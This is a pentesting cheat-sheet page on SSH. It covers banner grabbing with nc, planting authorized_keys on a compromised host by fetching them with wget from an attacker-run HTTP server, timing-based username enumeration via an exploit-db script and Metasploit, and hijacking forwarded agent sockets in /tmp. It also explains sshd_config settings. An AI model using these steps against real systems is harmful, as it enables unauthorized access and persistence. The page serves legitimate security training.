# 22 - SSH

## Theory

SSH, or **Secure Shell** or Secure Socket Shell, is a network protocol that provides users with a secure way to access a computer over an unsecured network.

{% hint style="success" %}
Attempt a SSH connection blindly (if we do not find any vulnerability) because sometimes we get a banner and we can get some information.
{% endhint %}

## Practice

### [Authentication](../general/lateral-movement/remote-services.md#ssh-lateral-movement)

### Banner grabbing

```bash
nc -vn <IP> 22
```

### SSH keys

For authentication with SSH keys, we can do it in 2 ways:

{% tabs %}
{% tab title="Way #1" %}
Create **SSH keys** on the compromised machine:

```bash
ssh-keygen # "Enter" all the time.
```

Rename the public key to "**authorized\_keys**":

```bash
mv id_rsa-pub authorized_keys
```

We copy the **id\_rsa** (private key) from the compromised machine to our system, and use it to authenticate:

```bash
ssh -i id_rsa <USERNAME>@<IP>
```
{% endtab %}

{% tab title="Way #2" %}
Create the **SSH keys** on our system:

```bash
ssh-keygen # "Enter" all the time.
```

We rename the file **id\_rsa.pub** (public key) to "**authorized\_keys**" and **transfer** it to the compromised machine, in the path `~/.ssh/authorized_keys`:

```bash
# On our attacking machine:
mv id_rsa.pub authorized_keys
sudo python3 -m http.server 80
# On the compromised machine:
wget http://<LHOST>/authorized_keys -O ~/.ssh/authorized_keys
```
{% endtab %}
{% endtabs %}

### Execute commands

```bash
# Spawn bash:
ssh <USER>@<IP> "<COMMAND>" 
ssh <USER>@<IP> -t "bash -l"
# Do not load the .bashrc file.
ssh <USER>@<IP> -f 'mv .bashrc .bashrc_bk; exit'
ssh <USER>@<IP> 'bash --norc'
```

### Fingerprint

#### How to check if SSH keys are valid with each other?

Sometimes, when we compromise a machine, we get the **authorized\_keys** (public key) and the **id\_rsa** (private key). However, **these keys may be unrelated**. To **verify** them, we **need both keys** and perform the following **commands**:

```bash
ssh-keygen -l -f authorized_keys
ssh-keygen -l -f id_rsa
```

If we see the same, both are related and it may be another factor why it is not letting us log in, such as restricted users in the **sshd\_config** file, etc. If they are not the same, you will have to look for other keys that are related or forget about that input vector.

#### SSH `from` directive

Specifies that in addition to public key authentication, the canonical name of the remote host or its IP address must be present in the comma-separated list of patterns. Example of an **authorized\_keys** with this directive:

```bash
from="*.example.test.com" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6C
cwSCx1BqzuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a
XQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38PZU8mpL5MP
/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk+JtTwSBooPr+F5lewP
cafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs4yeDXdDlP3SSd1ynKEJDnQhbhc1
tcJSPEn7WOD test@xd
```

In this case, it is from a domain, that we could try to add it with [nsupdate](53-dns/attack-techniques/dynamic-updates.md).

#### Weak public key

If the public key is weak, we can try to recover the private key with the following tool: [RsaCtfTool](https://github.com/Ganapati/RsaCtfTool)

#### Decrypt with private key

If we have a file that is encrypted with the private key (RSA), we can use openssl to decrypt it (if we have the key):

```
openssl rsautl -decrypt -inkey <PRIVATE_KEY> -in <ENCRYPT_FILE>
```

### Username enumeration

In some versions of OpenSSH you can do a timing attack to enumerate users. You can use a Python script or use a Metasploit module to exploit this:

```bash
# Metasploit
use scanner/ssh/ssh_enumusers
# Python script:
searchsploit -m linux/remote/45939.py
python 45939.py <IP> <USERNAME>
```

### SSH config files

```bash
ssh_config, sshd_config, authorized_keys, ssh_known_hosts, .shosts
```

{% hint style="danger" %}
Examining the `/etc/ssh/sshd_config` file is very important, as you can see the port on which you listen (usually port 22), the users that are allowed to log in via SSH (AllowUsers property), whether you allow login with root (PermitRootLogin), etc.
{% endhint %}

### Update SSH configuration

If we make a change to the sshd\_config file, we need to restart the SSH service to update it:

```
sudo systemctl restart sshd
```

### SSH Interesting configuration values (sshd\_config)

#### Port

The port that the SSH service is listening on. Ex: `Port 22`

**PasswordAuthentication**

Specifies whether password authentication is allowed. The default is `no`.

#### **PubkeyAuthentication**

Specifies whether public key authentication is allowed. The default is `yes`.

#### **PermitEmptyPasswords**

When password authentication is allowed, it specifies whether the server allows login to accounts with empty password strings. The default is `no`.

#### Root login

Specifies whether root can log in using ssh, default is `no`. Other values:

* `yes` : root can login using password and private key
* `without-password` or `prohibit-password`: root can only login with private key
* `forced-commands-only`: Root can login only using privatekey cand if the commands options is specified

#### AuthorizedKeysFile

Specifies files that contains the public keys that can be used for user authentication. I can contains tokens like `%h` , that will be replaced by the home directory. **You can indicate absolute paths** (starting in `/`) or **relative paths from the users home**. For example:

```bash
AuthorizedKeysFile    .ssh/authorized_keys access_granted
```

That setting will indicate that if you try to log in with the private key of any user (example: test\_user), SSH will compare the public key of your key with those located in `/home/test_user/.ssh/authorized_keys` and `/home/test_user/access_granted`.

### SSH Forward Agent exploitation

What can you do if you discover inside the `/etc/ssh_config` or inside `$HOME/.ssh/config` configuration this:

```
ForwardAgent yes
```

If you are root inside the machine you can probably **access any ssh connection made by any agent** that you can find in the __ `/tmp` directory:

```bash
ls -la /tmp
ls -la /tmp/ssh-haqzR16816
SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh test@10.10.10.10
```

## Troubleshooting

### Key exchange/encryption/host key (No matching)

```bash
# No matching key exchange method found:
ssh <IP> -oKexAlgorithms=+<KEY_EXCHANGE>
# No matching cipher found (with key exchange):
ssh <IP> -oKexAlgorithms=+<KEY_EXCHANGE> -c <CIPHER>
# No matching host key type found:
ssh <IP> -oHostKeyAlgorithms=+<HOST_KEY_TYPE>
```

### Problem in ssh2john

If we get the following message....:

```bash
AttributeError: module 'base64' has no attribute 'decodestring'
```

... we can solve this by editing a line in the **ssh2john** script:

![](../.gitbook/assets/ssh2john\_solved\_problem.png)
